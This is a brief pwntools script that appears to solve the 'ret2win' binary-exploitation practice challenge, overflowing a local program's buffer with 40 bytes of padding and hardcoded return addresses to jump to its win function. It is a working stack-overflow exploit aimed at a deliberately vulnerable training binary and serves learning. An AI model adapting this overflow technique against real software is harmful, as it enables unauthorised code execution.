from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

p = process("./ret2win")

payload = b"".join([
    b"A" * 40,
    # p64(0x000000000040053e),
    p64(0x00000000004007e1),
    b"B" * 8,
    b"C" * 8,
    p64(0x00400756),
])

# gdb.attach(p, """
#     b ret2win
# """)
p.recvuntil(b"read()!\n")
p.send(payload)
p.recvline()
p.interactive()
